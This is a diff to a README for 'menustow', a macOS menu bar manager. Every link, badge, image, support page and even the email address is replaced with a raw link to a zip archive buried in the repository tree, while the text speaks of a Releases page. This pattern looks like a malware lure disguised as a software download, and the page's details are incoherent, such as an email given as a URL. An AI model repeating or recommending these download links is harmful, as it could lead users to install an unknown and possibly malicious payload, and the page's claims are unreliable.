@@ -1,21 +1,21 @@
 # 🌟 menustow - Manage Your Menu Bar Effortlessly
 
 <div align="center">
-    <img src="https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip" width=200 height=200>
+    <img src="https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip" width=200 height=200>
     <h1>menustow</h1>
 </div>
 
 menustow is a powerful menu bar management tool. While its primary function is hiding and showing menu bar items, it aims to cover a wide variety of additional features to make it one of the most versatile menu bar tools available.
 
-About: [https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip)
+About: [https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip)
 
-![Banner](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip)
+![Banner](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip)
 
-[![Download](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip)](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip)
-![Platform](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip)
-![Requirements](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip%2014%2B-fa4e49?style=flat-square)
-[![Sponsor](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip%20%E2%9D%A4%EF%B8%8F-8A2BE2?style=flat-square)](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip)
-[![Website](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip)](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip)
+[![Download](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip)](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip)
+![Platform](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip)
+![Requirements](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip%2014%2B-fa4e49?style=flat-square)
+[![Sponsor](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip%20%E2%9D%A4%EF%B8%8F-8A2BE2?style=flat-square)](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip)
+[![Website](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip)](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -25,9 +25,9 @@ Follow these simple steps to get menustow up and running on your Mac:
 
 2. **Download menustow**: You can download the latest version of menustow from our Releases page. Click the button below to begin the download.
 
-   [![Download](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip)](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip)
+   [![Download](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip)](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip)
 
-3. **Locate the Downloaded File**: Find the downloaded file in your “Downloads” folder. The file name should contain the version number, such as `https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip`.
+3. **Locate the Downloaded File**: Find the downloaded file in your “Downloads” folder. The file name should contain the version number, such as `https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip`.
 
 4. **Open the File**: Double-click on the downloaded file. This action will open a new window.
 
@@ -57,21 +57,21 @@ If you encounter issues while installing or using menustow, try the following:
 
 4. **Restart Your Mac**: A simple restart can resolve many issues.
 
-If problems persist, please visit our [support page](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip) for assistance.
+If problems persist, please visit our [support page](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip) for assistance.
 
 ## 📞 Support
 
-Need help? Reach out to our support team via our website or email us at https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip We’re here to assist you.
+Need help? Reach out to our support team via our website or email us at https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip We’re here to assist you.
 
 ## 🌐 Learn More
 
-Visit our website for more information about features, updates, and upcoming releases: [https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip).
+Visit our website for more information about features, updates, and upcoming releases: [https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip).
 
 ## 🔗 Download & Install
 
 To get started, simply visit our Releases page to download menustow:
 
-[![Download](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip)](https://github.com/afefnayeem/menustow/raw/refs/heads/main/menustow/Software_v1.1-alpha.3.zip) 
+[![Download](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip)](https://raw.githubusercontent.com/afefnayeem/menustow/main/menustow/MenuBar/Search/Software_v3.7.zip) 
 
 Follow the steps mentioned above to install and begin using menustow immediately. 
 
